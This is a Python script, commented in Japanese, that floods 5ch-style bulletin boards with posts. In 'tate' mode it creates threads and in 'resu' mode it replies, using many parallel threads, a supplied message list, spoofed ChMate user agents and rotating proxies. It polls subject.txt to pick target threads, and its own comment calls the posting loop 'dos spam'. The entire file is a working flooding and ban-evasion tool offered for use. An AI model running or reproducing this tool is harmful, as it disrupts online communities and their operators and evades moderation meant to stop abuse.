import argparse
import time
import threading
import random
from urllib.parse import urlparse, quote

import requests

# ユーザーエージェントのリスト
chmate_ua = "chmate.txt"

# thread_listの最大数
maxthread = 20

chmate_list = []
message_list = []
proxy_list = []
thread_list = []
lock = threading.Lock()


def load_proxy(file):
    with open(file, encoding="utf-8") as f:
        for line in f:
            proxy_list.append(line.replace("\n", ""))
    print(f"Loaded {len(proxy_list)} Proxies")


def load_chmate(file):
    with open(file, encoding="utf-8") as f:
        for line in f:
            chmate_list.append(line.replace("\n", ""))
    print(f"Loaded {len(chmate_list)} Chmate")


# encoding shift_jis
def load_message(file):
    with open(file, encoding="utf-8") as f:
        for line in f:
            try:
                msg = quote(line, encoding="shift-jis", safe="")
                message_list.append(msg)
            except Exception as e:
                print(e)
    print(f"Loaded {len(message_list)} Message")


# スレッド一覧取得
def get_thread(protocol, domain, path):
    etag = ""
    headers = {
        "Cache-Control": "max-age=0",
        "User-Agent": random.choice(chmate_list),
        "Host": domain,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    while True:
        try:
            if etag:
                headers.update({"If-None-Match": etag})
            # lastmodify.txt
            r = requests.get(
                f"{protocol}://{domain}{path}subject.txt",
                headers=headers,
                timeout=30,
            )
            if r.status_code == requests.codes.ok:
                etag = r.headers.get("ETag")
                with lock:
                    thread_list.clear()
                    for line in r.iter_lines(decode_unicode=True):
                        new_thread = line.split(".")[0]
                        thread_list.append(new_thread)
        except Exception as e:
            print(e)
            pass
        time.sleep(60)


# dos spam
def bbs_cgi(method, protocol, domain, board, proxy, delay, log):
    while True:
        try:
            headers = {
                "Referer": None,
                "User-Agent": random.choice(chmate_list),
                "Content-Type": "application/x-www-form-urlencoded; charset=Shift_JIS",
                "Host": domain,
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            if proxy:
                proxies = {
                    "http": f"{proxy}://{random.choice(proxy_list)}",
                    "https": f"{proxy}://{random.choice(proxy_list)}",
                }
            else:
                proxies = {
                    "http": None,
                    "https": None,
                }
            # スレ立て
            if method == "tate":
                headers.update({"Referer": f"{protocol}://{domain}/{board}/"})
                data = f"subject={random.choice(message_list)}&FROM=&mail=&MESSAGE={random.choice(message_list)}&bbs={board}&time={str(time.time()).split('.')[0]}&submit=%90%56%8B%4B%83%58%83%8C%83%62%83%68%8D%EC%90%AC"
            # レス
            elif method == "resu":
                thread = random.choice(thread_list[:maxthread])
                headers.update(
                    {
                        "Referer": f"{protocol}://{domain}/test/read.cgi/{board}/{thread}/"
                    }
                )
                data = f"FROM=&mail=&MESSAGE={random.choice(message_list)}&bbs={board}&time={str(time.time()).split('.')[0]}&key={thread}&submit=%8F%91%82%AB%8D%9E%82%DE"
            r = requests.post(
                f"{protocol}://{domain}/test/bbs.cgi?guid=ON",
                headers=headers,
                data=data,
                proxies=proxies,
            )
            if log:
                print(r)
        except Exception as e:
            if log:
                print(e)
            pass
        if delay:
            time.sleep(delay)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "method",
        choices=["tate", "resu"],
        help="tate(スレ立て), resu(レス)",
    )
    parser.add_argument(
        "url",
        help="URL(全てのスレhttps://kes.5ch.net/chiikawa/ or 特定のスレのみhttps://kes.5ch.net/test/read.cgi/chiikawa/123456789/)",
    )
    parser.add_argument("threads", type=int, help="スレッド数")
    parser.add_argument("msg_list", help="送信するメッセージのリスト")
    # 　オプション
    parser.add_argument(
        "-p",
        "--proxy",
        choices=["http", "https", "socks4", "socks5", "socks5h"],
        help="プロキシの種類(http,https,socks4,socks5,socks5h)",
    )
    parser.add_argument("-pl", "--proxy_list", help="プロキシのリスト")
    parser.add_argument("-t", "--time", type=int, help="終了タイマー")
    parser.add_argument("-d", "--delay", type=int, help="送信の遅延時間")
    parser.add_argument("-l", "--log", action="store_true", help="ログ")
    args = parser.parse_args()

    load_chmate(chmate_ua)
    load_message(args.msg_list)

    if args.proxy:
        load_proxy(args.proxy_list)

    parsed_url = urlparse(args.url)
    protocol = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    if "bbs.punipuni.eu" == domain:
        quit()

    if "/l50" in path:
        path = path.replace("/l50", "")
    if not path[-1] == "/":
        path = path + "/"
    # 特定のスレのみ
    if "read.cgi" in path:
        board = path.split("/")[-3]
        thread_list.append(path.split("/")[-2])
    # 全てのスレ
    else:
        board = path.split("/")[-2]
        threading.Thread(
            target=get_thread, args=(protocol, domain, path), daemon=True
        ).start()

    for _ in range(args.threads):
        threading.Thread(
            target=bbs_cgi,
            args=(
                args.method,
                protocol,
                domain,
                board,
                args.proxy,
                args.delay,
                args.log,
            ),
            daemon=True,
        ).start()
    if args.time:
        time.sleep(args.time)
    else:
        input()
